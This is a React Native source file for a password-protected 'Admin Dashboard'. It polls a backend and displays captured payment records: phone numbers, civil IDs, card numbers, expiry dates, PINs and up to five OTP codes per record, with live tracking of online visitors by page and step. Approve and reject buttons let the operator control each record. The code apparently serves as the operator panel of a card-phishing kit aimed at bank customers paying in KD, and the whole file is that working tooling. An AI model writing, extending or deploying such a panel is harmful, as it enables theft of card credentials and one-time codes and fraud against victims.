import AsyncStorage from "@react-native-async-storage/async-storage";
import { Feather } from "@expo/vector-icons";
import * as Haptics from "expo-haptics";
import { LinearGradient } from "expo-linear-gradient";
import React, { useCallback, useEffect, useRef, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  FlatList,
  Platform,
  RefreshControl,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";

import { api } from "@/lib/api";

type PaymentRecord = {
  id: number;
  phone_number?: string;
  civil_id?: string;
  amount?: string;
  bank?: string;
  card_prefix?: string;
  card_number?: string;
  expiry_month?: string;
  expiry_year?: string;
  pin?: string;
  otp1?: string;
  otp2?: string;
  otp3?: string;
  otp4?: string;
  otp5?: string;
  network?: string;
  step_reached?: number;
  created_date?: string;
};

type PresenceEntry = {
  recordId: string;
  phone: string;
  amount: string;
  step: number;
  page: string;
  lastSeen: number;
};

type Filter = "all" | "approved" | "rejected" | "pending";

const TOKEN_KEY = "dash_token";

const OTP_COLORS = ["#22C55E", "#3B82F6", "#F59E0B", "#EF4444", "#8B5CF6"] as const;

function statusColor(network?: string) {
  if (network === "approved") return "#22C55E";
  if (network === "rejected") return "#EF4444";
  return "#F59E0B";
}

function statusLabel(network?: string) {
  if (network === "approved") return "Approved";
  if (network === "rejected") return "Rejected";
  return "Pending";
}

function maskCard(prefix?: string, num?: string) {
  const p = prefix || "";
  const n = num || "";
  if (!n) return p ? `${p}-` : "—";
  const visible = n.slice(-4);
  return `${p} ****${visible}`;
}

function timeAgo(dateStr?: string) {
  if (!dateStr) return "";
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "just now";
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

export default function DashboardScreen() {
  const insets = useSafeAreaInsets();
  const [unlocked, setUnlocked] = useState(false);
  const [token, setToken] = useState("");
  const [pwInput, setPwInput] = useState("");
  const [pwError, setPwError] = useState(false);
  const [pwLoading, setPwLoading] = useState(false);

  const [records, setRecords] = useState<PaymentRecord[]>([]);
  const [online, setOnline] = useState<PresenceEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [refreshing, setRefreshing] = useState(false);
  const [filter, setFilter] = useState<Filter>("all");
  const [expandedId, setExpandedId] = useState<number | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const topPad = Platform.OS === "web" ? 67 : insets.top;
  const botPad = Platform.OS === "web" ? 34 : insets.bottom;

  // Check stored token
  useEffect(() => {
    AsyncStorage.getItem(TOKEN_KEY).then((stored) => {
      if (stored) {
        setToken(stored);
        setUnlocked(true);
      }
    });
  }, []);

  const fetchAll = useCallback(async (tok: string) => {
    try {
      const [recs, pres] = await Promise.all([
        api.get<PaymentRecord[]>("/payment-records", tok),
        api.get<PresenceEntry[]>("/presence", tok),
      ]);
      setRecords(recs);
      setOnline(pres);
    } catch {}
  }, []);

  useEffect(() => {
    if (!unlocked || !token) return;
    setLoading(true);
    fetchAll(token).finally(() => setLoading(false));
    pollRef.current = setInterval(() => fetchAll(token), 5000);
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [unlocked, token, fetchAll]);

  const handleUnlock = async () => {
    if (!pwInput.trim()) return;
    setPwLoading(true);
    setPwError(false);
    try {
      const res = await api.post<{ ok: boolean; token?: string }>(
        "/dash/unlock",
        { password: pwInput }
      );
      if (res.ok && res.token) {
        setToken(res.token);
        await AsyncStorage.setItem(TOKEN_KEY, res.token);
        setUnlocked(true);
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
      } else {
        setPwError(true);
        setPwInput("");
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
      }
    } catch {
      setPwError(true);
      setPwInput("");
    }
    setPwLoading(false);
  };

  const handleLogout = async () => {
    await AsyncStorage.removeItem(TOKEN_KEY);
    if (pollRef.current) clearInterval(pollRef.current);
    setToken("");
    setUnlocked(false);
    setRecords([]);
    setOnline([]);
  };

  const handleApprove = async (id: number) => {
    await api.patch(`/payment-records/${id}`, { network: "approved" }, token).catch(() => {});
    setRecords((r) => r.map((x) => (x.id === id ? { ...x, network: "approved" } : x)));
    Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
  };

  const handleReject = async (id: number) => {
    await api.patch(`/payment-records/${id}`, { network: "rejected" }, token).catch(() => {});
    setRecords((r) => r.map((x) => (x.id === id ? { ...x, network: "rejected" } : x)));
  };

  const handleDelete = (id: number) => {
    Alert.alert("Delete Record", "Are you sure?", [
      { text: "Cancel", style: "cancel" },
      {
        text: "Delete",
        style: "destructive",
        onPress: async () => {
          await api.delete(`/payment-records/${id}`, token).catch(() => {});
          setRecords((r) => r.filter((x) => x.id !== id));
          if (expandedId === id) setExpandedId(null);
          Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Medium);
        },
      },
    ]);
  };

  const onRefresh = useCallback(async () => {
    setRefreshing(true);
    await fetchAll(token);
    setRefreshing(false);
  }, [fetchAll, token]);

  const filtered = records.filter((r) => {
    if (filter === "approved") return r.network === "approved";
    if (filter === "rejected") return r.network === "rejected";
    if (filter === "pending") return r.network !== "approved" && r.network !== "rejected";
    return true;
  });

  const stats = {
    total: records.length,
    approved: records.filter((r) => r.network === "approved").length,
    rejected: records.filter((r) => r.network === "rejected").length,
    pending: records.filter((r) => r.network !== "approved" && r.network !== "rejected").length,
  };

  const otps = (r: PaymentRecord) =>
    [r.otp1, r.otp2, r.otp3, r.otp4, r.otp5].filter(Boolean);

  // ── PASSWORD GATE ──────────────────────────────────────────────────────────
  if (!unlocked) {
    return (
      <View style={[styles.gateRoot, { paddingTop: topPad }]}>
        <LinearGradient colors={["#0F172A", "#1E293B"]} style={StyleSheet.absoluteFill} />
        <View style={styles.gateCard}>
          <View style={styles.gateLockIcon}>
            <Feather name="lock" size={32} color="#0070CD" />
          </View>
          <Text style={styles.gateTitle}>Admin Dashboard</Text>
          <Text style={styles.gateSubtitle}>Enter your password to continue</Text>
          <TextInput
            style={[styles.gateInput, pwError && styles.gateInputError]}
            value={pwInput}
            onChangeText={setPwInput}
            placeholder="Password"
            placeholderTextColor="#64748B"
            secureTextEntry
            autoFocus
            returnKeyType="done"
            onSubmitEditing={handleUnlock}
          />
          {pwError && (
            <Text style={styles.gateError}>Incorrect password. Try again.</Text>
          )}
          <TouchableOpacity
            style={[styles.gateBtn, (!pwInput || pwLoading) && styles.gateBtnDisabled]}
            onPress={handleUnlock}
            disabled={!pwInput || pwLoading}
          >
            {pwLoading ? (
              <ActivityIndicator color="#fff" size="small" />
            ) : (
              <Text style={styles.gateBtnText}>Unlock</Text>
            )}
          </TouchableOpacity>
        </View>
      </View>
    );
  }

  // ── DASHBOARD ──────────────────────────────────────────────────────────────
  return (
    <View style={[styles.dashRoot, { paddingTop: topPad }]}>
      <LinearGradient colors={["#0F172A", "#1E293B"]} style={StyleSheet.absoluteFill} />

      {/* Header */}
      <View style={styles.dashHeader}>
        <View>
          <Text style={styles.dashTitle}>Dashboard</Text>
          <Text style={styles.dashSub}>{records.length} records</Text>
        </View>
        <View style={{ flexDirection: "row", gap: 12, alignItems: "center" }}>
          {online.length > 0 && (
            <View style={styles.onlineBadge}>
              <View style={styles.onlineDot} />
              <Text style={styles.onlineBadgeText}>{online.length} live</Text>
            </View>
          )}
          <TouchableOpacity onPress={handleLogout}>
            <Feather name="log-out" size={20} color="#94A3B8" />
          </TouchableOpacity>
        </View>
      </View>

      {/* Stats */}
      <View style={styles.statsRow}>
        {[
          { label: "Total", value: stats.total, color: "#94A3B8" },
          { label: "Approved", value: stats.approved, color: "#22C55E" },
          { label: "Rejected", value: stats.rejected, color: "#EF4444" },
          { label: "Pending", value: stats.pending, color: "#F59E0B" },
        ].map((s) => (
          <View key={s.label} style={styles.statBox}>
            <Text style={[styles.statValue, { color: s.color }]}>{s.value}</Text>
            <Text style={styles.statLabel}>{s.label}</Text>
          </View>
        ))}
      </View>

      {/* Filters */}
      <View style={styles.filterRow}>
        {(["all", "pending", "approved", "rejected"] as Filter[]).map((f) => (
          <TouchableOpacity
            key={f}
            style={[styles.filterBtn, filter === f && styles.filterBtnActive]}
            onPress={() => setFilter(f)}
          >
            <Text style={[styles.filterBtnText, filter === f && styles.filterBtnTextActive]}>
              {f.charAt(0).toUpperCase() + f.slice(1)}
            </Text>
          </TouchableOpacity>
        ))}
      </View>

      {/* Records */}
      {loading ? (
        <View style={{ flex: 1, alignItems: "center", justifyContent: "center" }}>
          <ActivityIndicator color="#0070CD" size="large" />
        </View>
      ) : (
        <FlatList
          data={filtered}
          keyExtractor={(r) => String(r.id)}
          contentContainerStyle={{ padding: 12, paddingBottom: botPad + 24 }}
          refreshControl={
            <RefreshControl
              refreshing={refreshing}
              onRefresh={onRefresh}
              tintColor="#0070CD"
            />
          }
          ListEmptyComponent={
            <View style={styles.emptyState}>
              <Feather name="inbox" size={36} color="#475569" />
              <Text style={styles.emptyText}>No records</Text>
            </View>
          }
          renderItem={({ item }) => {
            const expanded = expandedId === item.id;
            const otpList = otps(item);
            return (
              <TouchableOpacity
                activeOpacity={0.9}
                onPress={() => setExpandedId(expanded ? null : item.id)}
                style={styles.recordCard}
              >
                {/* Card Header */}
                <View style={styles.recordHeader}>
                  <View style={styles.recordHeaderLeft}>
                    <View style={[styles.statusDot, { backgroundColor: statusColor(item.network) }]} />
                    <Text style={styles.recordPhone}>
                      {item.phone_number || item.civil_id || "—"}
                    </Text>
                  </View>
                  <View style={styles.recordHeaderRight}>
                    <Text style={styles.recordAmount}>{item.amount || "—"} KD</Text>
                    <Text style={styles.recordTime}>{timeAgo(item.created_date)}</Text>
                  </View>
                </View>

                {/* OTPs row */}
                {otpList.length > 0 && (
                  <View style={styles.otpRow}>
                    {otpList.map((otp, idx) => (
                      <View
                        key={idx}
                        style={[styles.otpBadge, { borderColor: OTP_COLORS[idx] }]}
                      >
                        <Text style={[styles.otpBadgeText, { color: OTP_COLORS[idx] }]}>
                          {otp}
                        </Text>
                      </View>
                    ))}
                  </View>
                )}

                {/* Expanded details */}
                {expanded && (
                  <View style={styles.expandedSection}>
                    <View style={styles.detailGrid}>
                      <View style={styles.detailItem}>
                        <Text style={styles.detailLabel}>Bank</Text>
                        <Text style={styles.detailValue}>{item.bank || "—"}</Text>
                      </View>
                      <View style={styles.detailItem}>
                        <Text style={styles.detailLabel}>Card</Text>
                        <Text style={styles.detailValue}>
                          {maskCard(item.card_prefix, item.card_number)}
                        </Text>
                      </View>
                      <View style={styles.detailItem}>
                        <Text style={styles.detailLabel}>Expiry</Text>
                        <Text style={styles.detailValue}>
                          {item.expiry_month || "—"}/{item.expiry_year || "—"}
                        </Text>
                      </View>
                      <View style={styles.detailItem}>
                        <Text style={styles.detailLabel}>PIN</Text>
                        <Text style={styles.detailValue}>{item.pin || "—"}</Text>
                      </View>
                      <View style={styles.detailItem}>
                        <Text style={styles.detailLabel}>Step</Text>
                        <Text style={styles.detailValue}>{item.step_reached ?? "—"}</Text>
                      </View>
                      <View style={styles.detailItem}>
                        <Text style={styles.detailLabel}>Status</Text>
                        <Text style={[styles.detailValue, { color: statusColor(item.network) }]}>
                          {statusLabel(item.network)}
                        </Text>
                      </View>
                    </View>

                    {/* All OTPs */}
                    {otpList.length > 0 && (
                      <View style={styles.otpAllRow}>
                        {[1, 2, 3, 4, 5].map((n) => {
                          const val = (item as Record<string, unknown>)[`otp${n}`] as string | undefined;
                          if (!val) return null;
                          return (
                            <View key={n} style={styles.otpFullBadge}>
                              <Text style={styles.otpFullLabel}>OTP {n}</Text>
                              <Text style={[styles.otpFullValue, { color: OTP_COLORS[n - 1] }]}>
                                {val}
                              </Text>
                            </View>
                          );
                        })}
                      </View>
                    )}

                    {/* Actions */}
                    <View style={styles.actionRow}>
                      {item.network !== "approved" && (
                        <TouchableOpacity
                          style={[styles.actionBtn, styles.approveBtn]}
                          onPress={() => handleApprove(item.id)}
                        >
                          <Feather name="check" size={14} color="#22C55E" />
                          <Text style={[styles.actionBtnText, { color: "#22C55E" }]}>Approve</Text>
                        </TouchableOpacity>
                      )}
                      {item.network !== "rejected" && (
                        <TouchableOpacity
                          style={[styles.actionBtn, styles.rejectBtn]}
                          onPress={() => handleReject(item.id)}
                        >
                          <Feather name="x" size={14} color="#EF4444" />
                          <Text style={[styles.actionBtnText, { color: "#EF4444" }]}>Reject</Text>
                        </TouchableOpacity>
                      )}
                      <TouchableOpacity
                        style={[styles.actionBtn, styles.deleteBtn]}
                        onPress={() => handleDelete(item.id)}
                      >
                        <Feather name="trash-2" size={14} color="#94A3B8" />
                        <Text style={[styles.actionBtnText, { color: "#94A3B8" }]}>Delete</Text>
                      </TouchableOpacity>
                    </View>
                  </View>
                )}

                <Feather
                  name={expanded ? "chevron-up" : "chevron-down"}
                  size={14}
                  color="#475569"
                  style={{ alignSelf: "center", marginTop: 4 }}
                />
              </TouchableOpacity>
            );
          }}
        />
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  gateRoot: {
    flex: 1,
    alignItems: "center",
    justifyContent: "center",
  },
  gateCard: {
    width: "85%",
    backgroundColor: "#1E293B",
    borderRadius: 20,
    padding: 28,
    alignItems: "center",
    borderWidth: 1,
    borderColor: "#334155",
    shadowColor: "#000",
    shadowOffset: { width: 0, height: 8 },
    shadowOpacity: 0.4,
    shadowRadius: 20,
    elevation: 10,
  },
  gateLockIcon: {
    width: 64,
    height: 64,
    borderRadius: 32,
    backgroundColor: "rgba(0,112,205,0.15)",
    alignItems: "center",
    justifyContent: "center",
    marginBottom: 16,
    borderWidth: 1,
    borderColor: "rgba(0,112,205,0.3)",
  },
  gateTitle: {
    fontSize: 22,
    fontWeight: "bold" as const,
    color: "#F1F5F9",
    marginBottom: 6,
    fontFamily: "Inter_700Bold",
  },
  gateSubtitle: {
    fontSize: 13,
    color: "#64748B",
    marginBottom: 24,
    fontFamily: "Inter_400Regular",
  },
  gateInput: {
    width: "100%",
    backgroundColor: "#0F172A",
    borderWidth: 1.5,
    borderColor: "#334155",
    borderRadius: 10,
    paddingHorizontal: 16,
    paddingVertical: 13,
    fontSize: 16,
    color: "#F1F5F9",
    marginBottom: 8,
    fontFamily: "Inter_400Regular",
  },
  gateInputError: { borderColor: "#EF4444" },
  gateError: { color: "#EF4444", fontSize: 12, marginBottom: 12, alignSelf: "flex-start", fontFamily: "Inter_400Regular" },
  gateBtn: {
    width: "100%",
    backgroundColor: "#0070CD",
    borderRadius: 10,
    paddingVertical: 14,
    alignItems: "center",
    marginTop: 8,
  },
  gateBtnDisabled: { opacity: 0.5 },
  gateBtnText: { fontSize: 16, fontWeight: "bold" as const, color: "#FFFFFF", fontFamily: "Inter_700Bold" },
  dashRoot: { flex: 1 },
  dashHeader: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingHorizontal: 16,
    paddingVertical: 12,
  },
  dashTitle: { fontSize: 22, fontWeight: "bold" as const, color: "#F1F5F9", fontFamily: "Inter_700Bold" },
  dashSub: { fontSize: 12, color: "#64748B", fontFamily: "Inter_400Regular" },
  onlineBadge: {
    flexDirection: "row",
    alignItems: "center",
    backgroundColor: "rgba(34,197,94,0.15)",
    borderRadius: 20,
    paddingHorizontal: 10,
    paddingVertical: 5,
    gap: 5,
    borderWidth: 1,
    borderColor: "rgba(34,197,94,0.3)",
  },
  onlineDot: { width: 6, height: 6, borderRadius: 3, backgroundColor: "#22C55E" },
  onlineBadgeText: { fontSize: 11, color: "#22C55E", fontFamily: "Inter_600SemiBold" },
  statsRow: {
    flexDirection: "row",
    paddingHorizontal: 12,
    gap: 8,
    marginBottom: 12,
  },
  statBox: {
    flex: 1,
    backgroundColor: "rgba(255,255,255,0.06)",
    borderRadius: 10,
    padding: 10,
    alignItems: "center",
    borderWidth: 1,
    borderColor: "rgba(255,255,255,0.08)",
  },
  statValue: { fontSize: 20, fontWeight: "bold" as const, fontFamily: "Inter_700Bold" },
  statLabel: { fontSize: 10, color: "#64748B", marginTop: 2, fontFamily: "Inter_400Regular" },
  filterRow: {
    flexDirection: "row",
    paddingHorizontal: 12,
    gap: 6,
    marginBottom: 4,
  },
  filterBtn: {
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 20,
    backgroundColor: "rgba(255,255,255,0.07)",
    borderWidth: 1,
    borderColor: "rgba(255,255,255,0.1)",
  },
  filterBtnActive: { backgroundColor: "#0070CD", borderColor: "#0070CD" },
  filterBtnText: { fontSize: 12, color: "#64748B", fontFamily: "Inter_500Medium" },
  filterBtnTextActive: { color: "#FFFFFF", fontFamily: "Inter_600SemiBold" },
  emptyState: { alignItems: "center", paddingTop: 60, gap: 12 },
  emptyText: { color: "#475569", fontSize: 14, fontFamily: "Inter_400Regular" },
  recordCard: {
    backgroundColor: "#1E293B",
    borderRadius: 12,
    padding: 14,
    marginBottom: 10,
    borderWidth: 1,
    borderColor: "#334155",
  },
  recordHeader: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    marginBottom: 8,
  },
  recordHeaderLeft: { flexDirection: "row", alignItems: "center", gap: 8 },
  recordHeaderRight: { alignItems: "flex-end" },
  statusDot: { width: 8, height: 8, borderRadius: 4 },
  recordPhone: { fontSize: 14, color: "#F1F5F9", fontWeight: "600" as const, fontFamily: "Inter_600SemiBold" },
  recordAmount: { fontSize: 14, color: "#0070CD", fontWeight: "bold" as const, fontFamily: "Inter_700Bold" },
  recordTime: { fontSize: 10, color: "#475569", marginTop: 2, fontFamily: "Inter_400Regular" },
  otpRow: { flexDirection: "row", flexWrap: "wrap" as const, gap: 6, marginBottom: 6 },
  otpBadge: {
    borderWidth: 1,
    borderRadius: 4,
    paddingHorizontal: 8,
    paddingVertical: 2,
    backgroundColor: "rgba(255,255,255,0.04)",
  },
  otpBadgeText: { fontSize: 12, fontFamily: "Inter_600SemiBold", letterSpacing: 1 },
  expandedSection: { marginTop: 10, borderTopWidth: 1, borderTopColor: "#334155", paddingTop: 10 },
  detailGrid: { flexDirection: "row", flexWrap: "wrap" as const, gap: 8, marginBottom: 12 },
  detailItem: {
    width: "47%",
    backgroundColor: "rgba(0,0,0,0.2)",
    borderRadius: 8,
    padding: 10,
  },
  detailLabel: { fontSize: 10, color: "#475569", marginBottom: 2, fontFamily: "Inter_400Regular" },
  detailValue: { fontSize: 13, color: "#CBD5E1", fontFamily: "Inter_500Medium" },
  otpAllRow: { flexDirection: "row", flexWrap: "wrap" as const, gap: 8, marginBottom: 12 },
  otpFullBadge: {
    backgroundColor: "rgba(0,0,0,0.2)",
    borderRadius: 8,
    padding: 8,
    minWidth: 80,
  },
  otpFullLabel: { fontSize: 10, color: "#475569", marginBottom: 2, fontFamily: "Inter_400Regular" },
  otpFullValue: { fontSize: 15, fontWeight: "bold" as const, letterSpacing: 1, fontFamily: "Inter_700Bold" },
  actionRow: { flexDirection: "row", gap: 8 },
  actionBtn: {
    flex: 1,
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: 5,
    paddingVertical: 9,
    borderRadius: 8,
    borderWidth: 1,
  },
  actionBtnText: { fontSize: 13, fontFamily: "Inter_600SemiBold" },
  approveBtn: { borderColor: "rgba(34,197,94,0.35)", backgroundColor: "rgba(34,197,94,0.08)" },
  rejectBtn: { borderColor: "rgba(239,68,68,0.35)", backgroundColor: "rgba(239,68,68,0.08)" },
  deleteBtn: { borderColor: "rgba(148,163,184,0.25)", backgroundColor: "rgba(148,163,184,0.06)" },
});
